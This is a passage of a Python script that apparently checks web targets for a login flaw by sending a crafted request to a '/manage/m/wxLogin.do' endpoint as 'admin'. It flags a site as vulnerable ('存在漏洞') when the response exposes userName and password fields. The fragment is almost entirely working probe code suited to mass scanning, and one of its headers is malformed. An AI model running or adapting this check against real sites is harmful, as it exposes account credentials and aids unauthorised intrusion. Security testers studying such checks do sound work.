...
def check(url):
    u = f"{url}/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1"
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.534.106 Safari/537.36',
        'Content - Type': 'application / x - www - form - urlencoded'
    }
    try:
        a = requests.post(url=u, headers=headers, verify=False,timeout=5)
        a.encoding = 'utf-8'
        html=a.text
        b = a.status_code
        if b == 200 and "userName" in html and "password" in html:
            print('[+]存在漏洞',url)
        else:
            print('[-]不存在漏洞',url)
